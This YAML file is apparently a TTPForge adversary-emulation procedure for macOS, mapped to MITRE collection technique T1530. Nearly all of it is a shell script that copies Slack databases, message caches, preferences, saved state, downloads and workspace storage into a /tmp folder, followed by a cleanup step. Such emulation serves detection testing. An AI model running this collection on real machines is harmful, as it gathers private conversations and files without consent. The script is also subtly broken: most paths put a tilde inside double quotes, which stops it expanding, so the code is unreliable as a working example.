---
api_version: 2.0
uuid: e145bb3d-be26-4852-9e69-54b3aa9400cf
name: Collect Slack Chat History
authors:
- TTPForge
description: |
  Extract and collect chat history and data from Slack application
mitre:
  tactics:
  - TA0009 Collection
  techniques:
  - T1530 Data from Cloud Storage
requirements:
  platforms:
  - os: darwin
args:
- name: output_path
  description: Output path for Slack data
  type: string
  default: /tmp/slack_data
- name: include_caches
  description: Include Slack cache files
  type: boolean
  default: true
steps:
- name: Create output directory
  inline: mkdir -p {{ .Args.output_path }}
- name: Collect Slack databases
  inline: |
    slack_path="~/Library/Application Support/Slack"
    if [ -d "$slack_path" ]; then
      mkdir -p {{ .Args.output_path }}/slack_db
      find "$slack_path" -name "*.db" -o -name "*.sqlite" 2>/dev/null | xargs -I {} cp {} {{ .Args.output_path }}/slack_db/ 2>/dev/null || true
    fi
- name: Extract message cache
  inline: |
    cache_path="~/Library/Caches/com.tinyspeck.slackmacgap"
    if [ -d "$cache_path" ]; then
      mkdir -p {{ .Args.output_path }}/slack_cache
      cp -r "$cache_path"/* "{{ .Args.output_path }}/slack_cache/" 2>/dev/null || true
    fi
- name: Collect Slack preferences
  inline: |
    find ~/Library/Preferences -name "*slack*" -o -name "*slackmac*" 2>/dev/null | xargs -I {} cp {} {{ .Args.output_path }}/ 2>/dev/null || true
- name: Extract saved state
  inline: |
    saved_path="~/Library/Saved Application State/com.tinyspeck.slackmacgap.savedState"
    if [ -d "$saved_path" ]; then
      cp -r "$saved_path" "{{ .Args.output_path }}/saved_state" 2>/dev/null || true
    fi
- name: Collect Slack data directory
  inline: |
    slack_data="~/Library/Application Support/Slack/downloads"
    if [ -d "$slack_data" ]; then
      mkdir -p {{ .Args.output_path }}/downloads
      cp -r "$slack_data" "{{ .Args.output_path }}/downloads/" 2>/dev/null || true
    fi
- name: Extract Slack workspaces metadata
  inline: |
    metadata_path="~/Library/Application Support/Slack/storage"
    if [ -d "$metadata_path" ]; then
      mkdir -p {{ .Args.output_path }}/workspace_metadata
      find "$metadata_path" -type f 2>/dev/null | head -20 | xargs -I {} cp {} {{ .Args.output_path }}/workspace_metadata/ 2>/dev/null || true
    fi
  cleanup:
    inline: |-
      rm -rf {{ .Args.output_path }}
      test ! -d {{ .Args.output_path }} && echo "Slack data cleanup completed"
tests:
- name: dry_run_test
  dry_run: true
